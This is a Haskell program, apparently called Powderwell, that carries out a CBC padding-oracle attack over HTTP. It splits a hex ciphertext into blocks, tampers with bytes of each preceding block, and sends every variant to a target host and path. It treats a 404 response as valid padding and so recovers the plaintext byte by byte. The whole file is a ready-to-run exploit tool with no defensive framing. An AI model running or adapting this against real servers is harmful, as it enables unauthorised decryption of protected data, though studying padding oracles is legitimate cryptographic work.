-- Powderwell

{-# LANGUAGE BangPatterns #-}

import Data.Int
import Data.Char
import Data.Word
import Data.Monoid (mempty, mappend, mconcat)
import Data.Function (on)
import Data.Bits (xor)
import Data.ByteString.Lazy (ByteString)
import qualified Data.ByteString as StrictByteString ()
import qualified Data.ByteString.Lazy as ByteString
import qualified Data.ByteString.Char8 as StrictChar8
import qualified Data.ByteString.Lazy.Char8 as Char8

import System.IO
import System.Environment (getArgs)

import Network.Http.Client

----

parseHexString :: (Integral a) => String -> [a]
parseHexString [] = []
parseHexString [_] = error "Bad hexadecimal string"
parseHexString (a:b:xs) = fromIntegral hex : parseHexString xs where
    hex = digitToInt a * 16 + digitToInt b

buildHexString :: (Integral a) => [a] -> String
buildHexString = map (intToDigit . fromIntegral) . foldr consByte [] where
    consByte x r = (x `div` 16) : (x `mod` 16) : r

breakBy :: Int -> [a] -> [[a]]
breakBy _ [] = []
breakBy n xs = let (xs1, xs2) = splitAt n xs in xs1 : breakBy n xs2

alter :: (Int64 -> Word8 -> Word8) -> ByteString -> ByteString
alter f b = snd $ ByteString.mapAccumR f' l b where
    l = ByteString.length b - 1
    f' i w = (pred i, f i w)

----

data Cipher = Cipher { ivBlock :: ByteString
                     , cipherBlocks :: [ByteString]
                     } deriving (Show)

blockSize :: Cipher -> Int64
blockSize = ByteString.length . ivBlock

blocksCount :: Cipher -> Int
blocksCount = succ . length . cipherBlocks

fromCipher :: Cipher -> ByteString
fromCipher c = ByteString.concat $ ivBlock c : (cipherBlocks c)

fromByteString :: ByteString -> Cipher
fromByteString bs = let (b':bs') = breakBs 16 bs in Cipher b' bs' where
    breakBs n bss = let (bs', bss') = ByteString.splitAt n bss in bs' : breakBs n bss'

fromHexString :: String -> Cipher
fromHexString s = let (b:bs) = bss s in Cipher b bs where
    bss = map ByteString.pack . breakBy 16 . parseHexString

toHexString :: Cipher -> String
toHexString = buildHexString . ByteString.unpack . fromCipher

dropBlock :: Cipher -> Cipher
dropBlock c = let (b:bs) = cipherBlocks c in Cipher b bs

headBlock :: Cipher -> ByteString
headBlock = head . cipherBlocks

headCipher :: Cipher -> Cipher
headCipher c = Cipher (ivBlock c) [headBlock c]

alterBlock :: (Int64 -> Word8 -> Word8) -> Cipher -> Cipher
alterBlock f (Cipher b bs) = Cipher (alter f b) bs

----

type Trial = Cipher -> IO Bool

runByteTrial :: Int64 -> Cipher -> Trial -> IO (Maybe Word8)
runByteTrial idx c0 t = run c0 (t . headCipher) [0 .. maxBound] where
    pad = fromIntegral (blockSize c0 - idx)
    xors w i
        | i < idx   = id
        | i == idx  = xor w . xor pad
        | otherwise = xor pad
    run _ _ []
        | pad == 1  = return $ Just 1
        | otherwise = return $ Nothing
    run c ct (w:ws)
        | pad == 1 && w == 1 = run c ct ws
        | otherwise          = do
            !v <- ct $ alterBlock (xors w) c
            if v
                then return $ Just w
                else run c ct ws

runBlockTrial :: Cipher -> Trial -> IO (Maybe ByteString)
runBlockTrial c0 t = run c0 $ blockSize c0 where
    xorHeads  = ByteString.zipWith xor `on` ivBlock
    run c 0   = return (Just $ ByteString.pack $ xorHeads c c0)
    run c idx = do
        let idx' = pred idx
            fx w i = if i == idx' then (xor w) else id
        mw <- runByteTrial idx' c t
        maybe (return mempty) (\w -> run (alterBlock (fx w) c) idx') mw

runTrial :: Cipher -> Trial -> IO (Maybe ByteString)
runTrial c t
    | blocksCount c == 1 = return mempty
    | otherwise          = do
        !bs <- runBlockTrial c t
        bss <- runTrial (dropBlock c) t
        return $ bs `mappend` bss

----

requestStatusCode :: Connection -> ByteString -> ByteString -> IO StatusCode
requestStatusCode c path bs = do
    req <- buildRequest $ http GET path'
    sendRequest c req emptyBody
    receiveResponse c statusHandler where
        path' = ByteString.toStrict $ ByteString.append path bs
        statusHandler resp _ = return $ getStatusCode resp

httpTrial :: Hostname -> Port -> ByteString -> ByteString -> IO Bool
httpTrial h p path bs = withConnection (openConnection h p) $ \c ->
    requestStatusCode c path bs >>= return . (== validCipherStatus) where
        validCipherStatus = 404

----

main :: IO ()
main = do
    [host, path, cth] <- getArgs

    hSetBuffering stdout NoBuffering
    putStrLn $ mconcat [" -- Abusing ", host, path, "{ct} ..."]

    let h = StrictChar8.pack host
        p = Char8.pack path
        ct = fromHexString cth
        pr True  = putStr "*" >> return True
        pr False = putStr "." >> return False
        ln = putChar '\n'
        trial = (>>= pr) . httpTrial h 80 p . Char8.pack . toHexString

    !pt <- runTrial ct trial

    ln >> ln >> putStrLn "Possible PT:" >> print pt
    ln >> putStrLn " -- Done"
